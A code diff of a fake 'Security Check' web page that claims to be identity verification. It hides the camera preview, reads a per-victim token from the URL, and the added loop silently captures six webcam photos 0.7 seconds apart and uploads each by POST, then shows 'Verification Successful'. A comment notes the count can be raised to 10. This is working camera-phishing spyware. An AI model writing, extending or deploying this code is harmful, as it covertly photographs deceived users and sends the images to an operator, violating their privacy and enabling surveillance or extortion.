@@ -24,21 +24,14 @@
       padding: 25px;
       text-align: center;
       box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-      animation: fadeIn 0.5s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
     }
 
     .card img {
-      width: 120px;
+      width: 110px;
       margin-bottom: 15px;
     }
 
     h2 {
-      margin: 10px 0;
       font-size: 22px;
       color: #333;
     }
@@ -46,10 +39,8 @@
     p {
       font-size: 14px;
       color: #666;
-      line-height: 1.4;
     }
 
-    /* ✅ BIG & CATCHY VERIFY BUTTON */
     button {
       margin-top: 25px;
       width: 100%;
@@ -61,18 +52,6 @@
       font-size: 20px;
       font-weight: bold;
       cursor: pointer;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-      transition: transform 0.15s ease, box-shadow 0.15s ease;
-    }
-
-    button:active {
-      transform: scale(0.96);
-      box-shadow: 0 6px 15px rgba(0,0,0,0.25);
-    }
-
-    button:disabled {
-      background: gray;
-      box-shadow: none;
     }
 
     .status {
@@ -82,7 +61,6 @@
       color: green;
     }
 
-    /* ✅ Camera preview completely hidden */
     video, canvas {
       display: none;
     }
@@ -91,14 +69,10 @@
 <body>
 
   <div class="card">
-    <!-- ✅ Safe placeholder image -->
-    <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="verification">
+    <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png">
 
     <h2>Security Check</h2>
-    <p>
-      For your safety, a quick identity verification is required.<br>
-      Your camera will be used only for this verification.
-    </p>
+    <p>Your camera will be used for verification.</p>
 
     <button id="verifyBtn">✅ Continue Verification</button>
     <div class="status" id="status"></div>
@@ -115,23 +89,29 @@
 
     const token = window.location.pathname.split("/").pop();
 
-    // ✅ Ask for camera permission (required by browser)
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => video.srcObject = stream)
       .catch(() => status.innerText = "Camera permission denied");
 
-    btn.addEventListener("click", () => {
+    btn.addEventListener("click", async () => {
       btn.disabled = true;
-      status.style.color = "#333";
-      status.innerText = "Verifying... Please wait";
+      status.innerText = "Verifying...";
 
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      let photosCount = 6; // ✅ YAHAN 6 KI JAGAH 10 KAR SAKTE HO
 
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
+      for (let i = 0; i < photosCount; i++) {
+        await new Promise(r => setTimeout(r, 700)); // ✅ 0.7 sec gap
 
-      canvas.toBlob(blob => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        const blob = await new Promise(resolve =>
+          canvas.toBlob(resolve, "image/jpeg")
+        );
+
         const form = new FormData();
         form.append("photo", blob);
 
@@ -139,10 +119,9 @@
           method: "POST",
           body: form
         });
+      }
 
-        status.style.color = "green";
-        status.innerText = "✅ Verification Successful";
-      });
+      status.innerText = "✅ Verification Successful";
     });
   </script>
 
